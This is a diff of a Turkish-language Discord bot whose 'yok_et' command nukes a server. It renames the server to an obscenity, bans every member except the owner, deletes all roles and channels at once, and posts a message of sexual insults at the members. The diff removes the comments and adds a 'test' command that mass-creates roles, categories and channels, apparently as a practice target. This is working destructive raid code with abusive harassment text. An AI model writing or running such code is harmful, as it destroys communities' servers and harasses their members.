@@ -18,36 +18,28 @@ async def yok_et(ctx):
     """Sunucuyu saniyeler içinde yok eder"""
     guild = ctx.guild
     
-    # Sunucu adını değiştir
     try:
         await guild.edit(name="orospu çocukları siktim laaan")
     except:
         pass
     
-    # Tüm işlemleri paralel çalıştır
     tasks = []
     
-    # Herkesi banla (guild.members zaten tüm üyeleri verir)
     for member in guild.members:
         if member != guild.owner and member != bot.user:
             tasks.append(member.ban(reason="Sunucu temizliği"))
     
-    # Tüm rolleri sil
     for role in guild.roles:
         if role != guild.default_role:
             tasks.append(role.delete())
     
-    # Tüm kanalları ve kategorileri sil
     for channel in guild.channels:
         tasks.append(channel.delete())
     
-    # Tüm işlemleri aynı anda çalıştır (Discord rate limitine takılabilir, ama hız maksimize edilir)
     await asyncio.gather(*tasks, return_exceptions=True)
     
-    # Tek kanal oluştur
     new_channel = await guild.create_text_channel("tarafından-sıkıldı-hadi-yallah")
     
-    # Mesajı gönder
     await new_channel.send(
         "**LemonSe Bot** tarafından sıkıldı hadi yallah!\n\n"
         "Ana bacı sövüyorum:\n"
@@ -59,5 +51,34 @@ async def yok_et(ctx):
         "- Hadi yallah orospu çocukları, Discord'dan silin gidin!\n"
         "- Sonra da gelip ağlamayın, ananızı sikeyim sizin! 😘"
     )
+
+@bot.command()
+async def test(ctx):
+    """Test ortamı oluşturur: 30 kanal, 50 kategori, 100 rol"""
+    guild = ctx.guild
+    tasks = []
+    
+    # 100 rol oluştur
+    for i in range(1, 101):
+        role_name = f"Test Rol {i}"
+        tasks.append(guild.create_role(name=role_name, reason="Test amacıyla oluşturuldu"))
+    
+    # 50 kategori oluştur
+    for i in range(1, 51):
+        category_name = f"Test Kategori {i}"
+        tasks.append(guild.create_category(name=category_name, reason="Test amacıyla oluşturuldu"))
+    
+    # 30 metin kanalı oluştur (kategorilere eklemeden, genel kanal olarak)
+    for i in range(1, 31):
+        channel_name = f"test-kanal-{i}"
+        tasks.append(guild.create_text_channel(name=channel_name, reason="Test amacıyla oluşturuldu"))
+    
+    # Tüm işlemleri paralel çalıştır
+    results = await asyncio.gather(*tasks, return_exceptions=True)
+    
+    # Kaç başarılı olduğunu hesapla
+    success_count = sum(1 for r in results if not isinstance(r, Exception))
+    
+    await ctx.send(f"✅ Test ortamı oluşturuldu! {success_count} nesne başarıyla eklendi. (30 kanal, 50 kategori, 100 rol hedeflenmişti)")
 
 bot.run(os.getenv("DISCORD_TOKEN"))
